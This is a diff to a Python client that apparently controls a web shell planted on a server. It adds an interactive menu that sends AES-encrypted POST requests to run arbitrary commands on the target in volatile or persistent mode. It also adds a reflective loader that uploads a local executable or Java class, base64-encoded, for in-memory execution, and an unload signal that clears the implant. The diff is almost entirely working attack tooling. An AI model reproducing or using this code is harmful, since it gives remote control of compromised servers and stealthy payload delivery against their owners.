@@ -5,6 +5,7 @@ import string
 import argparse
 import sys
 import os
+import base64
 
 from Cryptodome.Cipher import AES
 from Cryptodome.Util.Padding import pad, unpad
@@ -71,8 +72,69 @@ def do_cmd(session, payload: str):
 
     while True:
         try:
-            cmd = input('> ')
-            if cmd.strip().lower() in ['exit', 'quit']:
+            action = input(f'{Colors.YELLOW}[1]{Colors.RESET}: Command execution {Colors.YELLOW}[2]{Colors.RESET}: Reflective Loader {Colors.YELLOW}[3]{Colors.RESET}: Exit > ')
+
+            if action == '1': # terminal
+                while True:
+
+                    cmd = input('> ')
+                    if cmd.strip().lower() in ['exit', 'quit']:
+                        break
+                    if not cmd.strip():
+                        continue
+
+                    param_str = f'action=CMD&cmd={cmd}&mode=' + ('volatile' if args.volatile else 'persistent')
+
+                    dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
+                    class_len = len(dynamic_bytes)
+
+                    raw_payload = struct.pack('>I', class_len) + dynamic_bytes + param_str.encode('utf-8')
+                    encrypted_payload = aes_encrypt(raw_payload)
+
+                    headers = {
+                        'Content-Type': 'application/octet-stream'
+                    }
+
+                    resp = session.post(args.url, data=encrypted_payload, headers=headers)
+
+                    try:
+                        resp_text = aes_decrypt(resp.content).decode(args.encoding)
+                        print(resp_text)
+                    except Exception as ex:
+                        print(resp.text)
+
+            elif action == '2':
+
+                payload_path = input(f'Payload source ({"*.exe" if args.script == "cs" else "*.class"})> ')
+                if not os.path.exists(payload_path):
+                    print_error('Payload not found: ' + payload_path)
+                    continue
+
+                with open(payload_path, 'rb') as f:
+                    payload_exe = f.read()
+
+                param_str = f'action=PELOADER&mode=' + ('volatile' if args.volatile else 'persistent') + f'&z0=x64&z1={base64.b64encode(payload_exe).decode("utf-8")}'
+
+                class_len = len(payload_bytes)
+
+                raw_payload = struct.pack('>I', class_len) + payload_bytes + param_str.encode('utf-8')
+                encrypted_payload = aes_encrypt(raw_payload)
+
+                print_logs(f'Length: {len(payload_exe)}')
+
+                headers = {
+                    'Content-Type': 'application/octet-stream'
+                }
+
+                resp = session.post(args.url, data=encrypted_payload, headers=headers)
+
+                try:
+                    resp_text = aes_decrypt(resp.content).decode(args.encoding)
+                    print(resp_text)
+                except Exception as ex:
+                    print(resp.text)
+
+            elif action == '3':
                 print_logs("Sending UNLOAD signal to clear memory...")
                 param = 'action=UNLOAD'
                 raw_payload = struct.pack('>I', 0) + param.encode('utf-8')
@@ -82,28 +144,11 @@ def do_cmd(session, payload: str):
                 resp = session.post(args.url, data=encrypted_payload, headers=headers)
                 print_success(f"Server response: {resp.text.strip()}")
                 break
-            if not cmd.strip():
-                continue
 
-            param_str = f'action=CMD&cmd={cmd}&mode=' + ('volatile' if args.volatile else 'persistent')
+            else:
+                print_error('Unknown action')
 
-            dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
-            class_len = len(dynamic_bytes)
-
-            raw_payload = struct.pack('>I', class_len) + dynamic_bytes + param_str.encode('utf-8')
-            encrypted_payload = aes_encrypt(raw_payload)
-
-            headers = {
-                'Content-Type': 'application/octet-stream'
-            }
-
-            resp = session.post(args.url, data=encrypted_payload, headers=headers)
-
-            try:
-                resp_text = aes_decrypt(resp.content).decode(args.encoding)
-                print(resp_text)
-            except Exception as ex:
-                print(resp.text)
+            
 
         except KeyboardInterrupt:
             break
